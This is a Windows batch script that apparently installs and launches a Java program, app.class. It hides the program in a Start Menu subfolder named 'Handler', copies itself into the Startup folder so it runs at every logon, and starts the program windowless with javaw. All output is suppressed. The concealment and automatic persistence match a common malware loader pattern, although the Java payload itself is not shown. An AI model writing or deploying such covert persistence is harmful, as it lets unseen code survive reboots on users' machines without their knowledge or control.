@echo off
setlocal

REM Check if app.class exists in the current folder
if exist "app.class" (
    REM Create the Handler folder if it doesn't exist
    mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Handler" > NUL 2>&1

    REM Move app.class to the Handler folder
    move app.class "%appdata%\Microsoft\Windows\Start Menu\Programs\Handler\" > NUL 2>&1
)

copy ".\run.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" > NUL 2>&1

REM Run your Java application
javaw -cp "%appdata%\Microsoft\Windows\Start Menu\Programs\Handler" app > NUL 2>&1

endlocal
